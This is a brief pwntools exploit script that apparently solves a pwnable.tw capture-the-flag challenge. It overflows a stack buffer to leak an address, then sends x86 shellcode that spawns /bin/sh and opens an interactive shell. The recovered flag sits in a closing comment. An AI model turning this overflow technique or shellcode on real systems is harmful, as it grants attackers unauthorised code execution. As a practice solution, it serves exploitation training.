from pwn import *
r=remote('chall.pwnable.tw', 10000)

leakgadget = p32(0x8048087)
payload0 = 'A'*20 
payload0 += leakgadget
print payload0

r.recvuntil(':')
r.send(payload0)
leakaddr = u32(r.recv(1024)[:4])
print hex(leakaddr)
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'
payload1  = 'A'*20
payload1 += p32(leakaddr+20)
payload1 += shellcode
r.send(payload1)
r.interactive()
#FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}